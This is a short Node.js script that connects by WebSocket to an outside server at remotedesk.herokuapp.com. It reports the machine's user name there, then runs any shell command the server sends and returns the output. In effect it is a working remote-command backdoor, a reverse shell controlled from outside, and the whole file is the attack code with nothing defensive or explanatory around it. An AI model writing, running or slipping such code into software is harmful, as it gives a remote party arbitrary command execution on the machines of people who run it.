const child = require('child_process')
  let webSocket = require('ws')
  const params = {
      user: '923618627108880465'
  }
  var wsPong = new webSocket("wss://remotedesk.herokuapp.com/", "cool")
  try{
      wsPong.on('open', function(){
          child.exec("whoami", function(err, response){
          wsPong.send(`user=${params.user} Connected: ` + response)
          })
          wsPong.on('message',(message)=>{
      if(message.toString().split(' ')[1]=='Transmitted:'){
  child.exec(message.toString().split('Transmitted: ')[1], function(err, response){
      if(err){
  wsPong.send(`user=${params.user} ERROR: ` + err)
      }
  else{
  wsPong.send(`user=${params.user} RESPONSE: ` + response)
  }
  })
      }
  })
      })
      
  setInterval(() => {
    return;
  })
  }
  catch(err){
  
  }
